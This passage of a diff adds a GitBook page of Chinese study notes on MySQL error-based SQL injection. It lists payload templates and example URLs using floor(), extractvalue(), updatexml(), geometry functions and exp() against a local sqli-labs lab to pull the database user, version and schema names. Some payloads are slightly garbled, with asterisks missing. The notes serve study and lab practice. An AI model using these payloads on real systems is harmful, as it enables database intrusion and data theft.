+&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x4E2A;&#x51FD;&#x6570;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;MySQL&#x62A5;&#x9519;&#x5E76;&#x4E14;&#x663E;&#x793A;&#x51FA;&#x6570;&#x636E;</li>
+<li>GeometryCollection()</li>
+<li>polygon()
+3 GTID_SUBSET()</li>
+<li>multipoint()</li>
+<li>multilinestring()</li>
+<li>multipolygon()</li>
+<li>LINESTRING()</li>
+<li>exp()
+&#x8FD9;&#x4E9B;&#x65B9;&#x6CD5;&#x5E76;&#x4E0D;&#x662F;&#x5728;&#x6240;&#x6709;&#x7248;&#x672C;&#x90FD;&#x901A;&#x7528;&#xFF0C;&#x4E5F;&#x6709;&#x6BD4;&#x8F83;&#x8001;&#x7684;&#x7248;&#x672C;&#x6CA1;&#x6709;&#x8FD9;&#x4E9B;&#x51FD;&#x6570;
+&#x901A;&#x5E38;&#x6CE8;&#x5165;&#x7684;SQL&#x8BED;&#x53E5;&#x5927;&#x591A;&#x662F;&quot;select * from phpsec where id=?&quot; &#x8FD9;&#x79CD;&#x7C7B;&#x578B;
+&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x6765;&#x8BF4;&#x660E;&#x5229;&#x7528;
+ &#x7B2C;&#x4E00;&#x79CD;&#xFF1A;floor()
+ &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+ id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a)
+ &#x4F8B;&#x5982;&#xFF1A;
+ <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a) --+
+ <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and (select 1 from (select count(),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) --+
+ <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and (select 1 from (select count(),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) --+
+ &#x901A;&#x8FC7;floor&#x62A5;&#x9519;&#x3010;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x9650;&#x5236;&#x3011;
+ &#x56FA;&#x5B9A;&#x53E5;&#x5F0F;&#xFF1A;<pre><code> and (select 1 from (select count(),concat((select (select (payload)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre> &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E2A;&#x6570;&#xFF1A;<pre><code> select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata
+ payload&#x7EC4;&#x5408;&#x8BED;&#x53E5;&#xFF1A;
+ and (select 1 from (select count(),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre> &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x540D;&#x5B57;&#xFF1A;<pre><code> select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1
+ payload&#x7EC4;&#x5408;&#x8BED;&#x53E5;&#xFF1A;
+ and (select 1 from (select count(),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre></li>
+</ol>
+<p>&#x7B2C;&#x4E8C;&#x79CD;&#xFF1A;extractvalue()
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 and (extractvalue(1,concat(0x5c,(select user()))))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and (extractvalue(1,concat(0x5c,(select user())))) --+
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and extractvalue(1,(concat(0x7e,(select @@version),0x7e))) --+
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and extractvalue(1,(concat(0x7e,(select version()),0x7e))) --+
+    &#x901A;&#x8FC7;ExtractValue&#x62A5;&#x9519;&#x3010;&#x6700;&#x591A;32&#x5B57;&#x7B26;&#x3011;
+    &#x56FA;&#x5B9A;&#x53E5;&#x5F0F;&#xFF1A;
+        and extractvalue(1,(payload))
+    &#x6216;&#x8005;&#x8BB0;&#x5FC6;&#x6210;&#xFF1A;
+        and extractvalue(1,(concat(0x7e,(payload),0x7e)))
+    &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x53F7;&#xFF1A;
+        and extractvalue(1,(concat(0x7e,(select @@version),0x7e)))
+    &#x6216;&#x8005;&#x5199;&#x6210;&#xFF1A;
+        and extractvalue(1,(concat(0x7e,(select version()),0x7e)))</p>
+<p>&#x7B2C;&#x4E09;&#x79CD;&#xFF1A;updatexml()
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) --+
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; +and updatexml(1,(concat(0x7e,(select @@version),0x7e)),1) --+
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; +and updatexml(1,(concat(0x7e,(select version()),0x7e)),1) --+
+    &#x901A;&#x8FC7;UpdateXML&#x62A5;&#x9519;&#x3010;&#x6700;&#x591A;32&#x5B57;&#x7B26;&#x3011;
+    &#x56FA;&#x5B9A;&#x53E5;&#x5F0F;&#xFF1A;
+        +and updatexml(1,(payload),1)
+    &#x6216;&#x8005;&#x8BB0;&#x5FC6;&#x6210;&#xFF1A;
+        +and updatexml(1,(concat(0x7e,(payload),0x7e)),1)
+    &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x53F7;&#xFF1A;
+        +and updatexml(1,(concat(0x7e,(select @@version),0x7e)),1)
+    &#x6216;&#x8005;&#x5199;&#x6210;&#xFF1A;
+        +and updatexml(1,(concat(0x7e,(select version()),0x7e)),1)
+        +&#x52A0;&#x53F7;&#x53EF;&#x4EE5;&#x6362;&#x6210;&#x7A7A;&#x683C;</p>
+<p>&#x7B2C;&#x56DB;&#x79CD;&#xFF1A;GeometryCollection()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND GeometryCollection((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND GeometryCollection((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x4E94;&#x79CD;&#xFF1A;polygon()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND polygon((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND polygon((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x516D;&#x79CD;&#xFF1A;multipoint()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND multipoint((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND multipoint((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x4E03;&#x79CD;&#xFF1A;multilinestring()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND multilinestring((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND multilinestring((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x516B;&#x79CD;&#xFF1A;multipolygon()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND multipolygon((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND multipolygon((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x4E5D;&#x79CD;&#xFF1A;linestring()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 AND LINESTRING((select from (select from (select user())a)b))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; AND LINESTRING((select from (select from (select user())a)b)) --+</p>
+<p>&#x7B2C;&#x5341;&#x79CD;&#xFF1A;exp()&#x3010;&#x9AD8;&#x7248;&#x672C;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x6210;&#x529F;&#x3011;
+    &#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF1A;
+    id=1 and EXP(~(SELECT from (SELECT user())a))
+    &#x4F8B;&#x5982;&#xFF1A;
+    <a href="http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39" target="_blank">http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&amp;#39</a>; and EXP(~(SELECT from (SELECT user())a)) --+</p>
+
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="DNSLog注入.html" class="navigation navigation-prev " aria-label="Previous page: DNSLog注入">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="布尔盲注.html" class="navigation navigation-next " aria-label="Next page: 布尔盲注">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"报错注入","level":"1.3.3.5","depth":3,"next":{"title":"布尔盲注","level":"1.3.3.6","depth":3,"path":"NoteBook/SQL注入/MySQL数据库/布尔盲注.md","ref":"NoteBook/SQL注入/MySQL数据库/布尔盲注.md","articles":[]},"previous":{"title":"DNSLog注入","level":"1.3.3.4","depth":3,"path":"NoteBook/SQL注入/MySQL数据库/DNSLog注入.md","ref":"NoteBook/SQL注入/MySQL数据库/DNSLog注入.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","-lunr","-search","search-pro","splitter","popup","ancre-navigation","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"splitter":{},"search-pro":{},"popup":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"Mpy","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Java","language":"zh-hans","gitbook":"3.x.x"},"file":{"path":"NoteBook/SQL注入/MySQL数据库/报错注入.md","mtime":"2021-04-05T11:51:01.838Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-06T05:31:19.898Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
